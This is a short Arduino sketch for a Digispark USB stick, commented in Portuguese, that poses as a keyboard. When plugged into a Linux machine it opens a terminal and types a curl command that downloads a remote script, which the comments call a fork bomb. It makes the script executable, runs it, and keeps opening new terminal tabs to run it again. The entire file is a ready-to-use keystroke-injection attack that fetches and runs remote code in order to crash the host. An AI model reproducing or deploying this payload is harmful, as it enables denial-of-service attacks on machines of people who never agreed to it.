#include <stdlib.h>
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(2000);
  //Acessa o menu de busca do S.O
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  //Busca pelo Terminal
  DigiKeyboard.print("terminal");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //Faz download do script Fork Bomb e coloca como executável.
  DigiKeyboard.print("curl -o script https://raw.githubusercontent.com/LuizHenz/Digispark/main/script.txt && chmod +x script");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Executa o script
  DigiKeyboard.print("./script");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  //Abre um segunto terminal com CTRL+SHIFT+T e executando o script mais uma vez.
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("./script");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}